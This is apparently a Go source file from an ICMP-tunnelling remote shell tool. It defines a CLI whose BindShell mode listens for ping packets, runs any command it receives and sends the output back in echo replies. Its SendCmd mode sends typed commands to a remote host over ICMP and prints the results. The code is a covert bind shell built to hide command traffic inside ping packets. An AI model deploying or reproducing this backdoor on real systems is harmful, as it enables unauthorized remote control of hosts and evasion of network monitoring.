package main

import (
	"fmt"
	"log"
	"net"

	"golang.org/x/net/ipv4"
)

type CLI struct {
	icmp  ICMPCat
	input Input
	sema  chan bool
}

func NewCLI() (*CLI, error) {
	icmp, err := NewICMPCat()
	if err != nil {
		return nil, err
	}
	return &CLI{
		icmp:  icmp,
		input: Input{},
		sema:  make(chan bool, 1),
	}, nil
}

// Open a shell that executes remote requests
func (cli *CLI) BindShell() {
	log.Println("bind")
	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
		msg := parseMsg(res)
		if msg.kind == msgCmdType {
			fmt.Println(msg.value)
			msg := newMsgResType(runCmd(msg.value))
			cli.icmp.Send(ipv4.ICMPTypeEchoReply, msg.bytes, peer.String())
		}
	})
	cli.icmp.Listen()
}

// Execute a command on the remote host
func (cli *CLI) SendCmd(cmd, host string) {
	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
		msg := parseMsg(res)
		if msg.kind == msgResType {
			fmt.Printf("%s", msg.value)
			cli.sema <- true
		}
	})
	cli.input.On(func(b []byte) {
		cmd := newMsgCmdType(string(b))
		cli.icmp.Send(ipv4.ICMPTypeEcho, cmd.bytes, host)
		<-cli.sema
	})
	cli.icmp.Listen()
}
